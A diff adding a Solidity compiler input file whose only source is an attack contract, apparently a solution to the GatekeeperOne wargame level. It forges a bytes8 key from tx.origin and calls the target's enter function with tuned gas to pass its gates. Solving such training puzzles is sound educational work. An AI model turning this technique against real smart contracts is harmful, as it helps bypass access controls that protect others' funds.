@@ -1,0 +1,35 @@
+{
+  "language": "Solidity",
+  "sources": {
+    "contracts/GateKeeperOne/AttackGateKeeperOne.sol": {
+      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n/// @title AttackGateKeeperOne\n/// @author IbCaOs\ncontract AttackGateKeeperOne {\n    address public gateKeeper;\n\n    constructor(address _target) {\n        gateKeeper = _target;\n    }\n\n    function attack(uint256 gas, uint256 offsetGas) external {\n        bytes8 dataKey = getDataKey();\n        // Solution for second gate (gas + offset)\n        (bool success, ) = gateKeeper.call{gas: gas + offsetGas}(abi.encodeWithSignature(\"enter(bytes8)\", dataKey));\n        require(success, \"ERROR: GAS\");\n    }\n\n    function getDataKey() public view returns (bytes8) {\n        // Solution for third gate\n        // First, we extract the last 2 bytes of tx.origin by casting it using\n        // bytes8(abi.encodePacked(uint16(uint160(tx.origin)))). We then perform a right shift\n        // to position these two bytes at the beginning.\n        bytes8 dataKey = bytes8(abi.encodePacked(uint16(uint160(tx.origin)))) >>\n            48;\n\n        // After shifting the last two bytes, we use bitwise operations to set the first byte to 0x10.\n        return dataKey | bytes8(0x1000000000000000);\n    }\n}\n"
+    }
+  },
+  "settings": {
+    "optimizer": {
+      "enabled": true,
+      "runs": 200
+    },
+    "outputSelection": {
+      "*": {
+        "*": [
+          "abi",
+          "evm.bytecode",
+          "evm.deployedBytecode",
+          "evm.methodIdentifiers",
+          "metadata",
+          "devdoc",
+          "userdoc",
+          "storageLayout",
+          "evm.gasEstimates"
+        ],
+        "": [
+          "ast"
+        ]
+      }
+    },
+    "metadata": {
+      "useLiteralContent": true
+    }
+  }
+}
